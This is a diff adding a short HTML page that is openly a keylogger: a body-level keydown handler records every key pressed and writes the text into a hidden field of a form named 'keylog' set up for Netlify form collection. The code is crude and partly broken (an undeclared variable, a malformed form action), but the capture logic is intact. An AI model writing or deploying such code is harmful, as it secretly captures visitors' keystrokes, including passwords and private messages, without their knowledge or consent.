@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    function GetChar(event){
+	var x = event.keyCode;
+	let y = String.fromCharCode(x)
+	z += (y)
+	function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function demo() {
+    for (let lol = 0; lol < 10; lol++) {
+        await sleep(lol * 10);
+    }
+document.getElementById("z").innerHTML += (y);
+document.getElementById("bruh").innerHTML = ("<input type='hidden' name='keys' value="+(document.getElementById("z").innerHTML));
+}
+
+demo();
+}
+  </script>
+</head>
+<form name="keylog" action="POST" data-netlify="true">
+<p id=bruh></p>
+</form>
+<body onkeydown="GetChar(event);">
+<p id=z></p>
+</body>
+</html>
